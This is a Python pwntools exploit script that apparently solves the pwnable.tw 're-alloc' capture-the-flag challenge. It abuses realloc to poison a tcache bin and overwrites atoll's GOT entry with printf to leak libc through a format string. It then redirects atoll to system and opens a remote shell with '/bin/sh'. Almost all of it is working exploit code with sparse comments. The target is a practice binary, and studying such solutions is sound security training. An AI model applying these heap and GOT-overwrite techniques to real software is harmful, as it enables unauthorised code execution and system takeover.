#!/usr/bin/env python3

from pwn import *

elf = ELF("./re-alloc_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

#p = elf.process()
p = remote("chall.pwnable.tw", 10106)


def alloc(index, size=b"", data=b""):
    p.sendlineafter("Your choice: ",str(1))
    p.sendlineafter("Index:",str(index))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def realloc(index,size,data=b''):
    p.sendlineafter("Your choice: ",str(2))
    p.sendlineafter("Index:",str(index))
    p.sendlineafter("Size:",str(size))
    if(size==0): return
    p.sendlineafter("Data:",data)

def free(index):
    p.sendlineafter("Your choice: ",str(3))
    p.sendlineafter("Index:",str(index))
#note: if alloc(0)=> heap[0]==ptr1, alloc(1)=> heap[1]==ptr2
#malloc two 0x20 chunks
alloc(0,24)
alloc(1,24)
#free the 1st chunk
free(0)
#using the realloc(ptr,NULL)==free(ptr) to free the second chunk
#Now in the 0x20 tcache bin: 2nd's chunk => 1st'chunk
realloc(1,0)
#modify 1st quadword = got.atoll and 2nd quadword = 0(bypass the double free mitigation).
#now in the 0x20 tcache bin: 2nd's chunk => fake chunk(got.atoll)
realloc(1,24,p64(elf.got.atoll)+p64(0))
#malloc the 1st chunk again, the 1st chunk and 2nd chunk now pointing to one arena
#now in the 0x20 tcachebin: fake chunk(got.atoll) 
alloc(0,24)
#realloc the large chunk which is expand the chunk   
realloc(0,40)
#free the 1st chunk, so in the 0x20 tcache bin has fake chunk and the heap[0]==0, if we alloc 1st chunk again we will get write primitive at atoll_got 
free(0)


alloc(0,50)
realloc(1,34,p64(0)*2)
realloc(1,50,p64(0)*2)
free(0)
realloc(1,0)
realloc(1,50,p64(elf.got.atoll)+p64(0))
alloc(0,50)
realloc(0,120)
free(0)
realloc(1,34,p64(0)*2)
free(1)

alloc(0,24,p64(elf.sym.printf))

p.sendlineafter("Your choice: ",str(3))
p.sendlineafter("Index:",b"%7$p")

leak = int(p.recvuntil("\nI",drop=True),16)
libc.address = leak - libc.sym._IO_2_1_stdout_
log.success("Libc base: "+ hex(libc.address))
raw_input("DEBUG")
p.sendlineafter("Your choice: ",str(1))
p.sendlineafter("Index:",b"") #this will send "\n" and the atoll("\n") the index set to 1 this is equal to sendline(1)
p.sendlineafter("Size:",b"%50c") #sendline(b"32")
p.sendlineafter("Data:",p64(libc.sym.system)) #overwrte got.atoll = system

free("/bin/sh\0")
p.interactive()